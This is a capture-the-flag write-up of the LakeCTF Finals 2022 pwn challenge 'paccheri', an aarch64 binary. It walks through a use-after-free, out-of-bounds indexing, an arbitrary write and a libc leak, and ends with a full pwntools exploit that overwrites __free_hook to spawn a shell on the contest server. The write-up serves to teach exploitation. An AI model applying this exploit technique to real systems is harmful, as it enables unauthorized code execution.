---
author: "Enigmatrix"
title: "[LakeCTF Finals 2022] paccheri"
date: 2022-11-07T00:17:30+08:00
description: "LakeCTF Finals 2022: paccheri (pwn) writeup."
tags: ["writeups", "ctf", "pwn"]
ShowBreadcrumbs: False
---
# paccheri

I played LakeCTF Finals 2022 with my team NUS Greyhats (in Switzerland!). We managed to get first blood on both pwn challenges (`i hate french` and `paccheri`).
This writeup will be for `paccheri` since `i hate french` was solved by 9 out of 10 teams.

This challenge was solved the unintended way, which is becoming a usual situation for me.

![](https://i.imgur.com/4zpwYvM.png)

Running `checksec`, we get:

```
[*] '~/ctfs/lakefinals22/paccheri/paccheri'
    Arch:     aarch64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Hmm, interesting to see that we have a `aarch64` challenge. Is this is MacOS / IoT / ARM challenge? Emulating this was going to be painful, but luckily the organizers had already thought of this.

There are a few files attached to the challenge, other than the usualy binary + libc. There is the `Dockerfile` & `compose.yml` which are usually meant to describe the service configuration. Also a `README.md`:

```
# How to not turn crazy (QEMU PTSD anyone?)

1. `docker compose build`
2. `docker compose up`
3. Connect to the challenge with `nc localhost 3700`, ssh into the arm64 VM
   with `ssh root@localhost -p 30022`

Note: The challenge is located in `/app` in the VM. The VM contains exactly the
`paccheri` and `libc.so.6` you're provided with. The only difference is that in
the VM, `/proc/self/maps` is symlinked to `/app/postal_codes` -- we unfortunately
cannot ship symlinks ;)
```

Very cool, they already have a setup to emulate `aarch64` and even managed to give us a `ssh` shell. 

## Analysis

```c
undefined8 main(void) {
  char *found;
  size_t section_start;
  ulong section_end;
  char section_name [20000];
  
  long local_8 = __stack_chk_guard;
  setvbuf(stdin,NULL,2,0);
  setvbuf(stdout,NULL,2,0);
  setvbuf(stderr,NULL,2,0);
  urandom_fd = fopen("/dev/urandom","r");
  heap_addr_ref = (ulong *)mmap(NULL,0x1000,3,0x22,0,0);
  mem_p_1 = heap_addr_ref + 1;
  ulong* local_4e38 = heap_addr_ref;
  FILE* postal_codes_fd = fopen("postal_codes","r");
  do {
    __isoc99_fscanf(postal_codes_fd,"%p-%p %2000[^\n]",&section_start,&section_end,section_name);
    if (*heap_addr_ref < section_end) {
      *heap_addr_ref = section_end;
    }
    found = strstr(section_name,"[heap]");
  } while (found == NULL);
  puts("Welcome to the Swiss post office");
  puts("Our famous privacy policies encrypt (and sign!) the destination of every packet");
  puts("How can we help you?");
  main2();
  if (local_8 - __stack_chk_guard == 0) {
    return 0;
  }
                    // WARNING: Subroutine does not return
  __stack_chk_fail(&__stack_chk_guard,0,local_8 - __stack_chk_guard,0);
}
```

From `README.md`, there is a symlink between `/proc/self/maps` and `/app/postal_codes`. Thus, the above code seems to be reading the memory map entries of the currently running process (given in `/proc/self/maps`) to parse the max address of the heap section.

![](https://i.imgur.com/l2EMrR3.png)

Then `main2` is called:

```c
void main2(void) {
  while (true) {
    puts("1. Send a package");
    puts("2. Report a lost package");
    puts("3. List outgoing packages");
    puts("4. Set address of outgoing package");
    puts("5. Check if a package is arrived");
    puts("6. Exit");
    puts("7. Get angry because you don\'t have an aarch64 machine available");
    puts("8. Complain because this menu is too long");
    putchar(10);
    int opt = read_int(opt);
    switch(opt) {
      case 1:
        send_package();
        break;
      case 2:
        report_lost_package();
        break;
      case 3:
        list_packages();
        break;
      case 4:
        set_address_package();
        break;
      case 5:
        check_package_arrival();
        break;
      case 6:
        exit(0);
        break;
      case 7:
        useless();
        break;
      case 8:
        useless2();
        break;
      default:
        puts("Vouz parlez franchoise?");
    }
  }
}
```

`useless` and `useless2` print some text and call `exit(0)`, so I'm leaving this part out. We have 5 legitimate options excluding exit.

### send_package

```c
void send_package(void)
{
  if (packages_len < 0x14) {
    package* pkg = (package *)malloc(0x18);
    long idx = (long)packages_len;
    packages_len = packages_len + 1;
    packages[idx] = pkg;
    char* address = (char *)malloc(0x18);
    puts("Please enter your destination address:");
    fgets(address,0x18,stdin);
    pkg->address = address;
    fread(&pkg->urandom_num,1,4,urandom_fd);
    address = (char *)pointer_auth_tech(print_pkg_arrival,pkg->urandom_num);
    pkg->pointer_auth = address;
    pkg->idx = packages_len + -1;
  }
  else puts("Sorry, we are swiss but we can\'t handle so many packages");
}
```

We can allocate upto `0x14 = 20` `package`s. I have defined each `package` as below:
```c
struct package {
  // pointer to 0x18-long malloc'ed char array
  char[0x18]* address;  // 0x00
  int idx;              // 0x08
  int urandom_num       // 0x0C
  void* pointer_auth    // 0x10
} // 0x18 bytes long
```

The only input is the 0x18-bytes long package address. There is a very weird calculation in `pointer_auth_tech`:

```c
ulong pointer_auth_tech(void* fnaddr, int num) {
  ulong uVar1 = pacga(fnaddr, num);
  return fnaddr ^ uVar1 & const_FFFF000000000000;
}
```

where `pacga` is a ARM64 instruction related to Pointer Authentication Code. Seems like a function pointer is 'protected' by pointer authentication using a random seed from `/dev/urandom`.

The function pointer is initially set to `print_pkg_arrival`:

```c
int print_pkg_arrival(char* arg) {
  return printf("The package has arrived to: %s!\n",arg);
}
```

### report_lost_package

```c
void report_lost_package(void) {
  puts("Which package did you lose?");
  int idx = read_int(idx);
  // BUG: UaF, also no bounds check
  free(packages[idx]->address);
  if ((idx < 0x12) && (-1 < idx)) {
    free(packages[idx]);
    packages[idx] = NULL;
  }
  else puts("You definitely did not.");
}
```

We have a Use-After-Free when we provide an index not lesser than 0x12, which `free`s the package address at that index but does not remove the package from the `packages` array. This leaves us with a package with dangling reference to `free`d memory, which we can use (Use-After-Free).

Furthermore, the index can be negative. So we can `free` the address of a supposed package that is before the `packages` array.

### list_packages

```c
void list_packages(void) {
  puts("---");
  uint state = 0;
  for (int i = 0; i < packages_len; i = i + 1) {
    printf("Address: %s",packages[i]->address);
    printf("id: %d\n",(ulong)(uint)packages[i]->idx);
    void* cb = undo_pacga(packages[i]->pointer_auth, packages[i]->urandom_num);
    printf("callback: %p\n", cb);
    void* pointer = packages[i]->pointer_auth;
    void* pac = pointer_auth_tech(
      (ulong)packages[i]->pointer_auth & ~const_FFFF000000000000,
      packages[i]->urandom_num);
    state = some_crc32_thing(state, pointer ^ pac);
    puts("---");
  }
  printf("Error state: %x\n", state);
}
```

Here we can see that we have an base address leak since the address of the callback is printed out, which is initially set the `print_pkg_arrival`. There also seems to be some calculation involving the pointer authentication that I thought involved CRC32 calculations due to the use of `0xedb88320`.

```c
uint some_crc32_thing(uint prev_state, ulong arg) {
  uint n = ~prev_state;
  for (uint i = 0; (int)i < 8; i = i + 1) {
    n = n ^ (uint)((long)((long)(0xff << (ulong)((i & 3) << 3)) & arg) >>
                  ((ulong)(i << 3) & 0x3f));
    for (uint b = 7; -1 < b; b = b + -1) {
      n = n >> 1 ^ -(n & 1) & 0xedb88320;
    }
  }
  return ~n;
}
```

### set_address_package

```c
void set_address_package(void) {
  puts("Which package do you want to edit?");
  // BUG: no bounds check
  int idx = read_int(idx);
  puts("Please enter the new address:");
  if (*heap_addr_ref < packages[idx]->address) {
    puts("This address is not in Switzerland!");
    exit(0);
  }
  int read = fread(packages[idx]->address,1,0x18,stdin);
  printf("read %d bytes\n", read);
  printf("New address: %s\n",packages[idx]->address);
  void* cb = undo_pacga(packages[idx]->pointer_auth, packages[idx]->urandom_num);
  printf("New callback: %p\n", cb);
}
```

This function from the lack of bounds check as well. Interestingly enough, it prints the callback even though it was never changed (this is for the intended solution).

### check_package_arrival
```c
void check_package_arrival(void) {
  puts("Which package do you want to check?");
  int idx = read_int();
  void* cb = undo_pacga(packages[idx]->pointer_auth, packages[idx]->urandom_num);
  (cb)(packages[idx]->address);
}
```

This method calls the callback that was set with the address of the package as the argument. Again, same lack of bounds check applies here. Sadly, `undo_pacga` returns a address only if it was protected by pointer authentication, or it returns 0 (which causes segfault when executed).

```c
ulong undo_pacga(void* pointer, ulong urandom_num) {
  ulong ret = pointer ^ pointer & const_FFFF000000000000;
  ulong check = pacga(ret, urandom_num);
  if ((check & const_FFFF000000000000) != (pointer & const_FFFF000000000000)) {
    ret = 0;
  }
  return ret;
}
```

## Exploitation

We have 3 out-of-bounds vuln which treat parts of the .data as a `package*`, and one UaF.

Initially, I was trying to use the UaF to corrupt a package and write my own function pointer there to get it executed (after bypassing PAC). I believe this to be the intended solution by the author.

However, while trying to do this, I realized that there was a easier way to approach the problem.

### Arbitrary Write

In every binary compiled by GCC, there exists an address in the `.data` section that points to itself. That is, the value at the address is the address itself.

![](https://i.imgur.com/eUV8ATD.png)

This also happens to be before the `packages` array:

![](https://i.imgur.com/AWizqlV.png)

If we provide `(0x113008-0x113040) / sizeof(package*)` as the index to `set_address_package`, it will treat this self-loop address as a `package*`. It will get the `address` pointer, which is at `package->address = package[0]` as the `address` is the first element of `package`. This, of course, is the self-loop address again. Then, we can write 0x18 bytes to this address. Note that there is a `*heap_addr_ref < package[i]->address` check, which does not get triggered since the heap is _after_ the base of the program.

This allows us to gain control over some memory in the `.data` section. However, just this is enough to get an arbitrary write primitive! We can setup our write to do the following (right side is the 'effect'):

![](https://i.imgur.com/Hwmk3s0.png)

Now if we treat `(0x113010-0x113040) / sizeof(package*)` (the pointer after the self-loop) as a `package*`, it's set up as below:

![](https://i.imgur.com/Ji26wt5.png)

Since we are writing to `address`, we now have arbitrary write using `set_address_package` when targetting this index. Furthermore, since the self-loop still points to itself afterwards, we can use this arbwrite as many times as we want.

### Libc Leak
There is no fancy `win` function in the binary itself, so we must leak a libc address to get us going.

Since we have arbitrary write and know the base address, we can overwrite `packages[0..3]` to a forged package, whose address is pointing to an address we want to leak e.g. `printf.got`. Running `list_packages` will then leak out the bytes we want.

### Getting command execution

With a libc address and base address known, one would normally overwrite the GOT section to gain command execution, but here it's protected by full RELRO and is not writable.

We can try to overwrite `__free_hook` instead but we are blocked by the `*heap_addr_ref` check. But of course, since we have arb write, we can just overwrite this as well. Our aim will be to get `free` called in `report_lost`, and we provide the index of a package with address set to `/bin/sh` to get `system("/bin/sh")` executed.

## Final Script

The overwriting of `heap_addr_ref` is combined with creation of a forged package, but the rest are as above.

```python
from pwn import *

#p = remote("localhost", "3700")
p = remote("chall.polygl0ts.ch", 3700)

def send_package(address):
    p.sendlineafter("menu is too long", "1")
    p.sendlineafter("address:", address)

def report_lost(idx):
    p.sendlineafter("menu is too long", "2")
    p.sendlineafter("lose?", str(idx))

def list_packages():
    p.sendlineafter("menu is too long", "3")
    pkgs = []
    while True:
        if b"Error" in p.recvuntil(("Error", "Address")):
            p.recvuntil(": ")
            error_state = int(p.recvline()[:-1], 16)
            break
        p.recvuntil(": ")
        address = p.recvuntil("id: ", drop=True)
        id = p.recvline()[:-1]
        p.recvuntil("callback: ")
        cb = p.recvline()[:-1]
        if cb == b'(nil)':
            cb = 0
        else:
            cb = int(cb, 16)
        p.recvuntil("---")
        pkgs.append((address, id, cb))
    return pkgs, error_state

def set_address(idx, address):
    p.sendlineafter("menu is too long", "4")
    p.sendlineafter("edit?", str(idx))
    p.sendafter("address:", address)

send_package(str(0))
pkgs, _ = list_packages()
base = pkgs[0][2] - 0xedc
info(f"{ hex(base) = }")

# just create some packages
for i in range(1, 7):
    send_package(b"/bin/sh\x00")

def arbwrite(where, what):
    set_address(-(0x113048 - 0x113008)//8, p64(base + 0x13008) + p64(base + 0x13018) + p64(where))
    set_address(-(0x113048 - 0x113010)//8,  what)

libc = ELF("./libc.so.6")

# Overwrite heap_addr_ref to point to base+0x13030, which contains 0xfffff....
# Also put the address of printf.got here so that we can use it as a forged package.
arbwrite(base + 0x13028, p64(base + 0x13030) + p64(0xffffffffffffffff) + p64(base + 0x12f78)) # printf.got @ +0x13038
# Write the address of the forged package as the packages of the first 3 elements in the packages array
arbwrite(base + 0x13048, p64(base + 0x13038) * 3)

# Leak out libc
pkgs, _ = list_packages()
leak = u64(pkgs[0][0].ljust(8, b'\0'))
info(f"{ hex(leak) =  }")
libc.address =  leak - libc.symbols.printf
success(f"{hex(libc.address) = }")

arbwrite(libc.symbols.__free_hook, p64(libc.symbols.system)*3)
report_lost(4) # calls free(package[4]->address), so system("/bin/sh") after the __free_hook overwrite


p.interactive()
```